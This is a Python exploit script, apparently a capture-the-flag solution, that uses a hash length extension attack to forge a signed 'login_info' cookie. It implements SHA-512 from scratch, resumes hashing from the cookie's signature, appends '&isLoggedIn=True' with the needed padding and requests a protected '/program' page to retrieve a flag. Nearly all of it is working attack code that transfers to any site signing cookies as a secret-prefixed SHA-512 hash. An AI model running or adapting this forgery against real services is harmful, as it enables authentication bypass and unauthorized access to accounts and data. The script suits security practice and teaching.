import sys
import requests
import base64
import struct
import urllib.parse

# Corrected Pure Python SHA-512 Implementation

class SHA512:
    def __init__(self, m=None, state=None, count=0):
        if state is None:
            self.h = [
                0x6a09e667f3bcc908, 0xbb67ae8584caa73b, 0x3c6ef372fe94f82b, 0xa54ff53a5f1d36f1,
                0x510e527fade682d1, 0x9b05688c2b3e6c1f, 0x1f83d9abfb41bd6b, 0x5be0cd19137e2179
            ]
        else:
            self.h = list(state)
        
        self.count = count
        self.buffer = b''
        
        if m:
            self.update(m)

    def rotr(self, x, n):
        return ((x >> n) | (x << (64 - n))) & 0xffffffffffffffff

    def ch(self, x, y, z):
        return (x & y) ^ (~x & z)

    def maj(self, x, y, z):
        return (x & y) ^ (x & z) ^ (y & z)

    def sum0(self, x):
        return self.rotr(x, 28) ^ self.rotr(x, 34) ^ self.rotr(x, 39)

    def sum1(self, x):
        return self.rotr(x, 14) ^ self.rotr(x, 18) ^ self.rotr(x, 41)

    def sigma0(self, x):
        return self.rotr(x, 1) ^ self.rotr(x, 8) ^ (x >> 7)

    def sigma1(self, x):
        return self.rotr(x, 19) ^ self.rotr(x, 61) ^ (x >> 6)

    def compress(self, chunk):
        w = [0] * 80
        for i in range(16):
            w[i] = struct.unpack('>Q', chunk[i*8:(i+1)*8])[0]
        
        for i in range(16, 80):
            w[i] = (self.sigma1(w[i-2]) + w[i-7] + self.sigma0(w[i-15]) + w[i-16]) & 0xffffffffffffffff

        a, b, c, d, e, f, g, h = self.h

        k = [
            0x428a2f98d728ae22, 0x7137449123ef65cd, 0xb5c0fbcfec4d3b2f, 0xe9b5dba58189dbbc,
            0x3956c25bf348b538, 0x59f111f1b605d019, 0x923f82a4af194f9b, 0xab1c5ed5da6d8118,
            0xd807aa98a3030242, 0x12835b0145706fbe, 0x243185be4ee4b28c, 0x550c7dc3d5ffb4e2,
            0x72be5d74f27b896f, 0x80deb1fe3b1696b1, 0x9bdc06a725c71235, 0xc19bf174cf692694,
            0xe49b69c19ef14ad2, 0xefbe4786384f25e3, 0x0fc19dc68b8cd5b5, 0x240ca1cc77ac9c65,
            0x2de92c6f592b0275, 0x4a7484aa6ea6e483, 0x5cb0a9dcbd41fbd4, 0x76f988da831153b5,
            0x983e5152ee66dfab, 0xa831c66d2db43210, 0xb00327c898fb213f, 0xbf597fc7beef0ee4,
            0xc6e00bf33da88fc2, 0xd5a79147930aa725, 0x06ca6351e003826f, 0x142929670a0e6e70,
            0x27b70a8546d22ffc, 0x2e1b21385c26c926, 0x4d2c6dfc5ac42aed, 0x53380d139d95b3df,
            0x650a73548baf63de, 0x766a0abb3c77b2a8, 0x81c2c92e47edaee6, 0x92722c851482353b,
            0xa2bfe8a14cf10364, 0xa81a664bbc423001, 0xc24b8b70d0f89791, 0xc76c51a30654be30,
            0xd192e819d6ef5218, 0xd69906245565a910, 0xf40e35855771202a, 0x106aa07032bbd1b8,
            0x19a4c116b8d2d0c8, 0x1e376c085141ab53, 0x2748774cdf8eeb99, 0x34b0bcb5e19b48a8,
            0x391c0cb3c5c95a63, 0x4ed8aa4ae3418acb, 0x5b9cca4f7763e373, 0x682e6ff3d6b2b8a3,
            0x748f82ee5defb2fc, 0x78a5636f43172f60, 0x84c87814a1f0ab72, 0x8cc702081a6439ec,
            0x90befffa23631e28, 0xa4506cebde82bde9, 0xbef9a3f7b2c67915, 0xc67178f2e372532b,
            0xca273eceea26619c, 0xd186b8c721c0c207, 0xeada7dd6cde0eb1e, 0xf57d4f7fee6ed178,
            0x06f067aa72176fba, 0x0a637dc5a2c898a6, 0x113f9804bef90dae, 0x1b710b35131c471b,
            0x28db77f523047d84, 0x32caab7b40c72493, 0x3c9ebe0a15c9bebc, 0x431d67c49c100d4c,
            0x4cc5d4becb3e42b6, 0x597f299cfc657e2a, 0x5fcb6fab3ad6faec, 0x6c44198c4a475817
        ]

        for i in range(80):
            t1 = (h + self.sum1(e) + self.ch(e, f, g) + k[i] + w[i]) & 0xffffffffffffffff
            t2 = (self.sum0(a) + self.maj(a, b, c)) & 0xffffffffffffffff
            h = g
            g = f
            f = e
            e = (d + t1) & 0xffffffffffffffff
            d = c
            c = b
            b = a
            a = (t1 + t2) & 0xffffffffffffffff

        self.h = [
            (x + y) & 0xffffffffffffffff for x, y in zip(self.h, [a, b, c, d, e, f, g, h])
        ]

    def update(self, m):
        if isinstance(m, str):
            m = m.encode('utf-8')
        
        self.buffer += m
        self.count += len(m) * 8
        
        while len(self.buffer) >= 128:
            self.compress(self.buffer[:128])
            self.buffer = self.buffer[128:]

    def digest(self):
        # Padding
        temp_buffer = self.buffer + b'\x80'
        while (len(temp_buffer) % 128) != 112:
            temp_buffer += b'\x00'
        
        # Length in bits (128 bits big-endian)
        # High 64 bits
        temp_buffer += struct.pack('>Q', (self.count >> 64) & 0xffffffffffffffff)
        # Low 64 bits
        temp_buffer += struct.pack('>Q', self.count & 0xffffffffffffffff)
        
        # Process remaining blocks
        for i in range(0, len(temp_buffer), 128):
            self.compress(temp_buffer[i:i+128])
            
        return b''.join(struct.pack('>Q', x) for x in self.h)

    def hexdigest(self):
        return self.digest().hex()

def get_padding(message_len):
    # message_len in bytes
    # Padding: 1 bit (0x80), then 0 bits, then 128-bit length
    # Block size 1024 bits = 128 bytes
    
    pad = b'\x80'
    while ((message_len + len(pad) + 16) % 128) != 0:
        pad += b'\x00'
        
    length_bits = message_len * 8
    pad += struct.pack('>Q', (length_bits >> 64) & 0xffffffffffffffff)
    pad += struct.pack('>Q', length_bits & 0xffffffffffffffff)
    return pad

def attack(url):
    print(f"[*] Targeting {url}")
    
    # 1. Get initial cookie
    s = requests.Session()
    try:
        r = s.get(url)
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        return

    if 'login_info' not in s.cookies:
        print("[-] No login_info cookie found")
        return
    
    cookie = s.cookies['login_info']
    print(f"[*] Got cookie: {cookie}")
    
    # 2. Parse cookie
    # Format: base64(message).signature
    try:
        # Handle potential unquoting issues if cookie is URL encoded
        if '%' in cookie:
            cookie = urllib.parse.unquote(cookie)
            
        # The cookie value might be quoted like "value"
        if cookie.startswith('"') and cookie.endswith('"'):
            cookie = cookie[1:-1]

        b64_msg, sig_part = cookie.split('.')
        msg = base64.b64decode(b64_msg)
        print(f"[*] Original message: {msg}")
        print(f"[*] Original signature part: {sig_part}")
        
        try:
            import string
            # Check if it's hex or base64
            
            if len(sig_part) == 88:
                 print("[*] Signature part length 88, assuming base64...")
                 sig_hex = base64.b64decode(sig_part).decode('utf-8')
                 print(f"[*] Decoded signature hex: {sig_hex}")
            elif len(sig_part) == 128:
                 print("[*] Signature part length 128, assuming hex...")
                 sig_hex = sig_part
            else:
                 print(f"[*] Signature part length {len(sig_part)}, trying base64...")
                 sig_hex = base64.b64decode(sig_part).decode('utf-8')
                 print(f"[*] Decoded signature hex: {sig_hex}")

        except Exception as e:
            print(f"[-] Error decoding signature base64: {e}")
            return

    except Exception as e:
        print(f"[-] Failed to parse cookie: {e}")
        return

    # 3. Perform Length Extension Attack
    
    try:
        # Parse the hash into 8 64-bit integers
        h_vals = []
        for i in range(0, len(sig_hex), 16):
            val = int(sig_hex[i:i+16], 16)
            h_vals.append(val)
        
        if len(h_vals) != 8:
            print(f"[-] Invalid signature length: {len(sig_hex)}")
            return

    except ValueError as e:
        print(f"[-] Error parsing signature hex: {e}")
        print(f"[-] Hex string was: {sig_hex}")
        return
    
    append_msg = b'&isLoggedIn=True'
    target_url = urllib.parse.urljoin(url, '/program')
    
    # We know secret length is 16 from the writeup and code
    candidate_len = 16
    print(f"[*] Using secret length: {candidate_len}")
    
    original_len = candidate_len + len(msg)
    padding = get_padding(original_len)
    total_len = original_len + len(padding)
    
    sha = SHA512(state=h_vals, count=total_len * 8)
    sha.update(append_msg)
    new_sig = sha.hexdigest()
    
    # The server expects the signature as a base64 encoded HEX string.
    new_sig_b64 = base64.b64encode(new_sig.encode()).decode()
    
    new_msg = msg + padding + append_msg
    new_cookie_val = base64.b64encode(new_msg).decode() + '.' + new_sig_b64
    
    # Use requests cookie jar
    cookies = {'login_info': new_cookie_val}
    
    try:
        # We use a new session for each attempt to avoid cookie pollution
        r = requests.get(target_url, cookies=cookies, allow_redirects=False, timeout=5)
        
        if r.status_code == 200:
            print(f"[+] Success!")
            with open('flag.pdf', 'wb') as f:
                f.write(r.content)
            print("[*] Saved to flag.pdf")
            if b'HTB{' in r.content:
                 start = r.content.find(b'HTB{')
                 end = r.content.find(b'}', start)
                 if end != -1:
                     print(f"[+] FLAG FOUND IN RAW BYTES: {r.content[start:end+1].decode()}")
            return
        else:
            print(f"[-] Failed. Status code: {r.status_code}")
            if r.status_code == 302:
                print(f"[-] Redirected to: {r.headers.get('Location')}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)
    
    attack(sys.argv[1])
